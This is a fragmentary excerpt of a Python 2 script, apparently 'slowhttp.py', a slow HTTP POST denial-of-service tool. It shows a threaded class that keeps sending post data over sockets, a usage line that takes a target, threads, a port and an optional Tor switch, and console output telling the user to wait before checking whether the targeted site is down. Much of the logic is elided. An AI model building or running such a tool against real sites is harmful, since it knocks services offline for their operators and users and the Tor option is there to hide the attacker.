...
class httpPost(Thread):
    ...
    def _send_http_post(self, pause=10):
        ...
        for i in range(0, 9999):
            ...
            print term.ERASE_BOL + term.UP + term.ERASE_EOL + "Posting: %s" % p + term.NORM
            self.socks.send(p)
...
def usage():
    print "./slowhttp.py -t <target> [-r <threads> -p <port> -T -h]"
    ...
    print "Eg. ./slowhttp.py -t 192.168.1.100 -r 256\n"
...
def main(argv):
    ...
    print term.DOWN + term.RED + "/*" + term.NORM
    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORM
    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORM
    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORM
    print term.RED + " */" + term.DOWN + term.DOWN + term.NORM
